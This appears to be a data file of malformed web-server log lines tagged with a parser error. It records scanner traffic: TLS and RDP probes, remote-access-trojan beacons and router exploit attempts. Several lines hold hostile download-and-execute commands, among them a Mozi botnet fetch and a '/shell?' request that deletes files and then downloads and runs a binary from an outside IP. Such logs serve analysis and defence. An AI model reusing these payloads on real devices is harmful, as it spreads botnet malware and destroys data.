2609@@185.254.31.134 - - [14/Nov/2021:05:38:55 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03\x0E\xCAF\xD7\x16\x1B\xDD8\xDA\x06d\x80\xD55\xC89\xAF\x94r\xF2\xABC\xF9\x99\x96\x18Y\xF6\x15\x1E\xCDd \xD9\x14\xDCF\xFB\x96\xD2D\x00<W\xCD\xA1\xC3r\xE7\xD6\x97{F\x9F[:c\x9D\x12\xF30\xC5\x04\x5C\x8C\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
2876@@89.248.165.210 - - [14/Nov/2021:16:49:00 +0000] "\x03\x00\x00\x13\x0E\xE0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2892@@58.253.50.44 - - [14/Nov/2021:17:35:29 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
2923@@167.71.102.181 - - [14/Nov/2021:18:25:37 +0000] "\x00\x0E8\x0BF\x88\xB6\xC8\x18U\x87\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
2941@@142.93.34.237 - - [14/Nov/2021:18:35:34 +0000] "" 400 0 "-" "-"@@list index out of range
2944@@20.55.53.144 - - [14/Nov/2021:18:55:55 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03F\xE5K\xA6\x07\x9D\xBE\xBEo\xD7\xF4|\xA9\x87\xF1\x1D#\xC8\x9AO\xB8x\xE8wH<Pq-\x82gY \x9B\x1D\xC0mZ\x8C|\xFFjH\xAE\x1F\xD7\xA9\x05\xFF}KVk\xA2\x8Dy\xF8\xBE\x011$z\xD1/\xAA\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
3060@@185.202.0.11 - - [26/Mar/2021:04:50:55 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3069@@178.128.194.144 - - [26/Mar/2021:07:53:05 +0000] "238\x00ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 166 "-" "-"@@list index out of range
3072@@209.141.33.74 - - [26/Mar/2021:07:59:50 +0000] "" 400 0 "-" "-"@@list index out of range
3201@@178.175.46.224 - - [26/Mar/2021:09:58:27 +0000] ";sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
3205@@61.219.11.153 - - [26/Mar/2021:10:53:45 +0000] "lv[endof]" 400 166 "-" "-"@@list index out of range
3233@@87.251.75.145 - - [26/Mar/2021:14:31:11 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3252@@209.141.33.74 - - [26/Mar/2021:15:55:56 +0000] "" 400 0 "-" "-"@@list index out of range
3278@@61.219.11.153 - - [26/Mar/2021:16:39:35 +0000] "lv[endof]" 400 166 "-" "-"@@list index out of range
3281@@104.248.94.93 - - [26/Mar/2021:17:06:39 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\xEE#UK(Wq|\xE7\x07\x1E\xD5\xCC\x0CQ\xE9\xA8\xE12Mk\x1D\xCDw>\x82\xEF\xCA\x0C\xD1k\xB4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
3289@@209.141.33.74 - - [26/Mar/2021:18:57:27 +0000] "" 400 0 "-" "-"@@list index out of range
3304@@209.141.33.74 - - [26/Mar/2021:20:37:14 +0000] "" 400 0 "-" "-"@@list index out of range
3394@@209.14.31.43 - - [26/Mar/2021:21:49:24 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
3506@@5.188.6.72 - - [25/Nov/2021:03:32:00 +0000] "" 400 0 "-" "-"@@list index out of range
3521@@94.232.43.63 - - [25/Nov/2021:03:59:51 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3522@@94.232.43.63 - - [25/Nov/2021:03:59:51 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3571@@112.237.172.218 - - [25/Nov/2021:05:17:23 +0000] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 166 "-" "-"@@list index out of range
3588@@205.185.124.100 - - [25/Nov/2021:06:10:37 +0000] "" 400 0 "-" "-"@@list index out of range
3613@@191.96.168.242 - - [25/Nov/2021:09:43:42 +0000] "\x00\x00\x02\x00" 400 166 "-" "-"@@list index out of range
3702@@205.185.124.100 - - [25/Nov/2021:14:44:02 +0000] "" 400 0 "-" "-"@@list index out of range
3706@@167.172.249.18 - - [25/Nov/2021:14:58:23 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03o\x92\xF58\xCB\x5C\xABz\x0B\x15\x85\xFDx\x09\x1A\x98W\x9D\xABL\xA7\xB1" 400 166 "-" "-"@@list index out of range
3772@@94.232.43.63 - - [25/Nov/2021:19:53:12 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3773@@94.232.43.63 - - [25/Nov/2021:19:53:12 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3779@@205.185.124.100 - - [25/Nov/2021:20:23:48 +0000] "" 400 0 "-" "-"@@list index out of range
3780@@89.248.165.23 - - [25/Nov/2021:20:37:51 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3798@@35.236.79.183 - - [25/Nov/2021:21:47:39 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\xC8s\xABw8\x80=\xBA\xA9Z\x1C\xA0\xE7\xDDvi^\xB7\x5C\xCA \xF0\xE7U\x8B\xAD\xC3\xC2\xA2\xEAs\xC2 \xD5V\xC9\xBEB\x067k\xA6\xA2" 400 166 "-" "-"@@list index out of range
3868@@94.232.40.134 - - [24/Nov/2021:01:56:29 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3882@@205.185.124.100 - - [24/Nov/2021:03:06:53 +0000] "" 400 0 "-" "-"@@list index out of range
3886@@20.55.53.144 - - [24/Nov/2021:03:14:19 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03=\xAC{C\xFDM1X:2:t\xAA2H\xC3\xF1\xC1\xC0\xC3!\xF62\xEA\xB1\xB1\xAFe\xCDw\x8D\x0B \xE2" 400 166 "-" "-"@@list index out of range
3888@@94.232.43.63 - - [24/Nov/2021:03:25:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3889@@94.232.43.63 - - [24/Nov/2021:03:25:29 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3890@@185.170.209.132 - - [24/Nov/2021:03:29:10 +0000] "" 400 0 "-" "-"@@list index out of range
3893@@185.100.87.136 - - [24/Nov/2021:03:45:30 +0000] "\xC9\x94\xD1\xA6\xAE\x9C\x05lM/\x09\x8Cp#\xEE\x9D*5#]\xC7R:\xC8\x8E/\x11\xB8\xCD\x89Z\xFB\xA4\x19f\xD2\xCE\xB3\xA1\x81\xBB\xFC\xA0\xDD%d1\x17\xA6%n\xC5" 400 166 "-" "-"@@list index out of range
3894@@185.100.87.136 - - [24/Nov/2021:03:45:30 +0000] "\x10 \x00\x00BBBB\xBA\x8C\xC1\xABDAAA" 400 166 "-" "-"@@list index out of range
3931@@103.153.76.212 - - [24/Nov/2021:05:37:15 +0000] "" 400 0 "-" "-"@@list index out of range
3940@@94.232.40.135 - - [24/Nov/2021:05:49:03 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3965@@87.251.75.40 - - [24/Nov/2021:07:47:13 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
3967@@157.245.176.143 - - [24/Nov/2021:08:08:16 +0000] "SSTP_DUPLEX_POST /sra_{BA195980-CD49-458b-9E23-C84EE0ADCD75}/ HTTP/1.1" 400 166 "-" "-"@@list index out of range
3970@@94.232.43.63 - - [24/Nov/2021:08:20:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3971@@94.232.43.63 - - [24/Nov/2021:08:20:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
3985@@193.56.29.48 - - [24/Nov/2021:08:55:16 +0000] "" 400 0 "-" "-"@@list index out of range
3986@@193.56.29.48 - - [24/Nov/2021:08:55:16 +0000] "" 400 0 "-" "-"@@list index out of range
3992@@87.251.75.40 - - [24/Nov/2021:09:08:01 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4097@@161.35.111.132 - - [24/Nov/2021:11:03:45 +0000] "" 400 0 "-" "-"@@list index out of range
4191@@77.247.93.41 - - [24/Nov/2021:12:29:08 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws HTTP/1.1" 499 0 "-" "Hello, world"@@list index out of range
4200@@94.232.46.202 - - [24/Nov/2021:12:49:36 +0000] "\x00\x0E87\xA5&\x08\xA2\x1B\xA0\xB1\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4228@@64.227.99.233 - - [24/Nov/2021:13:21:46 +0000] "\x00\x0E8\xF9%\x89\xAD\xF4\xB1\xBF\xCD\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4248@@20.55.53.144 - - [24/Nov/2021:14:13:48 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03$^\xAFZ\xB1\x87\xE31D\x8C\x87\xF9\xBF-_\xB6\x90f\x99\x09ml&_\xAF\xF1\x81V\xCD\x22\xBB\xEB $z\x93PQ\xA9\x82\xFA\xB7\xD0u\xAAVu\x988\x9D\x18N\xC3\x91\xED\x5C\xF2\x08oOneK\xA9\xC8\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
4284@@20.55.53.144 - - [24/Nov/2021:14:26:22 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xDB=\x89\x9F\x9AW\xDDqo\xFC\xFC\x03\x07Q :\x9B[\x09\xADE\xC6\x11c\x865\xCA;\xAEL\x83\xDA \x5C\xE9M\x9E\xB2\xB8\xB6\xF5-WT\x81\xBF\xBE\xFD_\xDF\xD4t\xFE\xB2CJ\x14\xFA\x8B0\x8C\x8D\xF7\xEE\xFD\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 166 "-" "-"@@list index out of range
4316@@167.71.102.95 - - [24/Nov/2021:15:43:45 +0000] "\x00\x0E8\xA7e6O-\x8BIS\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4333@@77.83.36.32 - - [24/Nov/2021:16:49:04 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4389@@161.35.86.181 - - [24/Nov/2021:20:42:28 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03?P\x87\xA6`\x88\x0E\xD4\x00\xE6\xCF#\xDF]C\xA8c\x1Ao\xDC\x14\x1F\x7F\x15\x00\xCDO\xDFwJ\xDF\xC0 &l\xEA\x83\x92`)\xAA\x17\xC6\xF8Ov\x86\x83\xC4o\xE0-\x87\x10O\xB4\x83yvf0\x1CC\x13\xE3\x00&\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4427@@66.240.205.34 - - [24/Nov/2021:22:27:35 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
4452@@94.232.43.63 - - [24/Nov/2021:23:11:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
4453@@94.232.43.63 - - [24/Nov/2021:23:11:57 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
4519@@222.186.19.235 - - [23/Nov/2021:00:03:17 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
4520@@222.186.19.235 - - [23/Nov/2021:00:03:17 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8A\xD5N\x82Q\x0C\xEA\x95j\x0E\xA1\xBA\xB1\xCD\xAD\x0BL\xC06\xA6y\x9A\x1Cr\x9A\xC4<\xB9\xE6\xA4\xDE\xA4 V\xC6\xB8\x0F\xCC'\x1A\x8C\xAC\xFD8o\xF7\xB4\xA0\x94\xBA\xB9i#\xD4\x91 \xB2K\x07@h\x91\xB0&O\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4530@@94.232.46.202 - - [23/Nov/2021:00:43:36 +0000] "\x00\x0E87\xA5&\x08\xA2\x1B\xA0\xB1\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
4570@@94.232.40.134 - - [23/Nov/2021:02:33:14 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4613@@66.240.205.34 - - [23/Nov/2021:04:16:48 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"@@list index out of range
4715@@94.232.40.135 - - [23/Nov/2021:06:15:49 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 166 "-" "-"@@list index out of range
4723@@34.86.35.13 - - [23/Nov/2021:06:39:52 +0000] "\x16\x03\x01\x00\xE5\x01\x00\x00\xE1\x03\x03\xEA\x01\xD8-\x0E' l\x0EZ\x22\xBF\xF1kH\x15\x89$\xF5\x10\xD7\xBA\x01`\xB1z\xACH\xD1\xA8\xC8>\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4872@@199.195.251.213 - - [23/Nov/2021:10:24:51 +0000] "" 400 0 "-" "-"@@list index out of range
4882@@120.2.68.6 - - [23/Nov/2021:10:35:24 +0000] "/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
4906@@205.185.124.100 - - [23/Nov/2021:12:20:50 +0000] "" 400 0 "-" "-"@@list index out of range
4919@@66.240.205.34 - - [23/Nov/2021:12:47:34 +0000] "H\x00\x00\x00tj\xA8\x9E#D\x98+\xCA\xF0\xA7\xBBl\xC5\x19\xD7\x8D\xB6\x18\xEDJ\x1En\xC1\xF9xu[l\xF0E\x1D-j\xEC\xD4xL\xC9r\xC9\x15\x10u\xE0%\x86Rtg\x05fv\x86]%\xCC\x80\x0C\xE8\xCF\xAE\x00\xB5\xC0f\xC8\x8DD\xC5\x09\xF4" 400 166 "-" "-"@@list index out of range
4921@@159.203.59.32 - - [23/Nov/2021:12:53:16 +0000] "\x16\x03\x01\x01\xFE\x01\x00\x01\xFA\x03\x03\x1C\xC4\x92\xD8\x9Ei~p\xEB&\xF9\xE1\xF8\x928\x1C\x91\xA2v\xA5\x02\xC5\xD0\xD4s\x5C\xD9.\xD3n~\xC6\x00\x01<\xCC\x14\xCC\x13\xCC\x15\xC00\xC0,\xC0(\xC0$\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
4928@@222.186.19.235 - - [23/Nov/2021:12:53:54 +0000] "\x05\x01\x00" 400 166 "-" "-"@@list index out of range
5160@@66.240.205.34 - - [23/Nov/2021:19:17:44 +0000] "145.ll|'|'|SGFjS2VkX0Q0OTkwNjI3|'|'|WIN-JNAPIER0859|'|'|JNapier|'|'|19-02-01|'|'||'|'|Win 7 Professional SP1 x64|'|'|No|'|'|0.7d|'|'|..|'|'|AA==|'|'|112.inf|'|'|SGFjS2VkDQoxOTIuMTY4LjkyLjIyMjo1NTUyDQpEZXNrdG9wDQpjbGllbnRhLmV4ZQ0KRmFsc2UNCkZhbHNlDQpUcnVlDQpGYWxzZQ==12.act|'|'|AA==" 400 166 "-" "-"@@list index out of range
5204@@185.142.236.40 - - [23/Nov/2021:20:46:47 +0000] "\x033S\x9Da\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
5300@@103.153.76.212 - - [23/Nov/2021:22:16:36 +0000] "" 400 0 "-" "-"@@list index out of range
5425@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5426@@94.232.43.63 - - [22/Nov/2021:02:54:45 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5434@@185.254.31.134 - - [22/Nov/2021:03:32:05 +0000] "\x16\x03\x01\x01C\x01\x00\x01?\x03\x03XH\xA2\xE3\x12\xB4B\x98\x0B\xCF\xA6\xC4)\xE7\xB6\xCC:^\x06\x8A\xA4\xADaQ\xDC\xE0s\x94\xF8\x8E#\x08 \xE8\x17\xD2<\x1C\xAA\xC8\xA6\xADD\xC5m\xD8\xA6pe\x83n\x8FW\x07\x90\x98Q\xA45z\xD5\x9E\xF7\xD5\x16\x00V\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\x9F\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0\xAE\xC0\xAC\xC0$\xC0(\xC0#\xC0'\xC0" 400 166 "-" "-"@@list index out of range
5507@@178.128.194.144 - - [22/Nov/2021:06:24:39 +0000] "\x00\xFFK\x00\x00\x00\xE2\x00 \x00\x00\x00\x0E2O\xAAC\xE92g\xC2W'\x17+\x1D\xD9\xC1\xF3,kN\x17\x14" 400 166 "-" "-"@@list index out of range
5508@@178.128.194.144 - - [22/Nov/2021:06:24:39 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"@@list index out of range
5565@@94.232.43.63 - - [22/Nov/2021:08:05:27 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5566@@94.232.43.63 - - [22/Nov/2021:08:05:27 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5572@@205.185.124.100 - - [22/Nov/2021:08:47:07 +0000] "" 400 0 "-" "-"@@list index out of range
5668@@193.46.254.155 - - [22/Nov/2021:10:46:42 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xA8\xA8L\xCCd\x15\x1Cx\xA2\x98!\x7F\x8A\xE8\x8C\xC7\x1AE\x05\xF3\x8EC\x1C\xFA-\xEB\xFEd\xA5evg\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
5963@@20.55.53.144 - - [22/Nov/2021:21:25:24 +0000] "\xA6\xE4Hb\xB5\x81\xC4t\xC1\x8CfR\x9B\xF3\x12\x1B\x97\x1B\x10Z\xD3" 400 166 "-" "-"@@list index out of range
5992@@94.232.43.63 - - [22/Nov/2021:22:08:16 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
5993@@94.232.43.63 - - [22/Nov/2021:22:08:16 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 166 "-" "-"@@list index out of range
6020@@139.162.145.250 - - [22/Nov/2021:23:11:38 +0000] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x03B=\x85\xDE\xF6\xC5H\x98\xCF\x13\xA9b=\xE7\x1D\xEA\x94\x16\xD4z6\xA4jqG\xEF/\xA9:\xD5\xB6\x19\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"@@list index out of range
6095@@120.212.134.153 - - [03/Apr/2021:05:22:13 +0000] "0;sh+/tmp/gpon80&ipv=0" 400 166 "-" "-"@@list index out of range
6239@@87.251.70.87 - - [03/Apr/2021:13:52:08 +0000] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=eltons" 400 166 "-" "-"@@list index out of range
7322@@159.89.103.83 - - [03/Apr/2021:15:56:35 +0000] "" 400 0 "-" "-"@@list index out of range
